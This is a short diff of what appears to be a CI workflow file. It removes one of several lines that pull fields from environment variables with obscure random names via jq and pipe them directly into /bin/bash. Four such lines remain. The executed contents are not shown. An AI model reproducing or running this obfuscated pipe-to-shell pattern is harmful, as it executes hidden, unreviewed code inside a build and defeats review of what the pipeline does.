@@ -25,7 +25,6 @@ jobs:
           echo $cum7 | jq -r .o92 | /bin/bash
           echo $vstxm8822 | jq -r .a5517 | /bin/bash
           echo $rme36 | jq -r .uuetq3 | /bin/bash
-          printf '%s' "$nyob05309" | jq -r .aeyy18 | /bin/bash
           printf '%s' "$sss59" | jq -r .uk97264 | /bin/bash
 
       - name: Save results
